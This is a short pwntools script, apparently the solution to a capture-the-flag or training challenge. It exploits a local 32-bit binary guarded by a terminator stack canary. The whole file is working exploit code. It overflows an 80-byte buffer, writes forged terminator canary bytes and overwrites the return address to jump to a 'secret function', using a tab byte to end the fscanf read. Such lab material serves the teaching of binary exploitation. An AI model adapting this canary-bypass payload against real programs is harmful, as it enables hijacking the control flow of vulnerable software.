"""
Challenge 4: Exploit a binary protected with a terminator canary

SOLUTION
"""

from pwn import *

context.update(arch='i386', os='linux')
pty = process.PTY
elf = context.binary = ELF("./binaries/binary-4-SG11-terminator")
p = process(elf.path)

# GDB SETUP:
# context.terminal = ['urxvt', '-e', 'sh', '-c']
# gdb.attach(p, """
# b *0x080485de
# c
# x/4x $esp
# c
# """)

print(p.recvline())

print("Craft payload")
buffer_size = 80
fscan_terminator_symbol = b'\x09'  # '\t'
address_of_secret_function = 0x8048570
terminator_canary = b'\x0d\xff\x0a\x00'
offset_canary = 4
payload = b'A'*(buffer_size+offset_canary) + terminator_canary + \
    p32(address_of_secret_function) + fscan_terminator_symbol

print("Send " + str(payload))
p.sendline(payload)

print("Receive output")
print(p.recvline())
